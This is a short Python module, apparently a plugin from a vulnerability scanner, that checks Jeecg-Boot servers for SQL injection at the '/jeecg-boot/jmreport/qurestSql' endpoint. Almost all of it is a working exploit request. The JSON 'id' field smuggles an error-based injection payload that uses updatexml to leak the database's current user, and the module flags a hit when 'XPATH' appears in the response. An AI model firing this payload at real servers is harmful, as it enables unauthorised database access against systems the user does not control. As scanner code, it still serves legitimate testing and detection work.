#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class JeecgSql:

    def run(self, urls):
        try:
            url = urls + '/jeecg-boot/jmreport/qurestSql'
            data = """{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}"""
            header = {
                "User-Agent":self.headers,
                "Content-Type":"application/json"
            }
            response = requests.post(url,headers=header, data=data,verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                OutPrintInfo("Jeecg-Boot", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("Jeecg-Boot", f"{url}")
                # with open("./result/jeecgBootSql.txt", "a") as w:
                #     w.write(f"{url}\n")
            else:
                OutPrintInfo("Jeecg-Boot", '不存在存在SQL注入')

        except Exception:
            pass

    def main(self, target):
        OutPrintInfo("Jeecg-Boot", '开始检测SQL注入...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        self.headers = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(proxy=proxy)

        self.proxy = req["proxy"]

        self.run(url)

        OutPrintInfo("Jeecg-Boot", 'SQL注入检测结束')